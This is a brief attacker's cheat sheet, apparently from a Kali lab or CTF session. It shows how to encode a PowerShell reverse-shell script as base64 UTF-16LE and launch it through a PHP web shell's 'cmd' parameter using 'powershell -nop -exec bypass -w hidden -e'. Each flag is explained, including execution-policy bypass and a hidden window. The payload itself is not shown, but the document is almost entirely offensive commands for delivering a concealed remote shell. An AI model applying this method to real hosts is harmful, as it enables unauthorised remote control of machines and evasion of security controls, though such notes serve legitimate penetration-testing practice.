convert ps1 rev shell to url compat

`iconv -f ASCII -t UTF-16LE  cthulu-rev444.ps1 | base64 | tr -d "\n"`

```sh
┌──(kali㉿kali)-[~]
└─$ iconv -f ASCII -t UTF-16LE  cthulu-rev444.ps1 | base64 | tr -d "\n"

```

run with:

```
my.php?cmd=powershell -nop -exec bypass -w hidden -e 
```

-nop = no profile
-exec bypass = execution  policy bypass
-w hidden = hidden window
-e = put the encoded  command  here
